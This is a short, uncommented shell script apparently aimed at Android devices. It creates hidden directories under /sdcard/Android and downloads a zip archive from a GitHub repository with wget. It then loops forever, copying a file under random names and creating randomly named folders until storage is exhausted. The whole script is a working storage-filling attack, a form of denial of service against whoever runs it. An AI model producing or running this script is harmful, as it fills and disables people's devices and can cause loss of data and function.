w() {
	
	while [ true ];do
	cd /sdcard/Android/.storage
	cp -f A $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
	cd .folder
	mkdir $RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM$RANDOM
	done
	}
	
	f() {
	cd /sdcard/Android
	if [ -e .storage ];then
	w
	else
	mkdir .storage
	cd .storage
	mkdir .folder
	wget https://github.com/rooted-cyber/upload/raw/master/A.zip
	unzip A.zip
	w
	fi
	}
	f